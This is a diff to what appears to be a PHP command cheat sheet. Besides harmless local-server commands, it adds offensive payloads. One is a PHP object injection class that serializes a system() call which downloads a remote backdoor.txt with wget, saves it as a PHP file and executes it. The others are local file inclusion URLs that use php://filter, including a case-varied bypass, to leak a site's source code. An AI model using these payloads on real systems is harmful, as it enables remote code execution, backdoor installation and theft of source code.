@@ -36,3 +36,17 @@ php -i | grep "php.ini"
 
 # To start a local webserver for the cwd on port 3000 (requires php >= 5.4):
 php -S localhost:3000
+
+#PHP serialization for payloads
+class PHPObjectInjection
+{
+   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
+}
+
+echo urlencode(serialize(new PHPObjectInjection));
+
+#PHP local file inclusion - PHP filters
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=php=pHp://FilTer/convert.base64-encode/resource=index.php
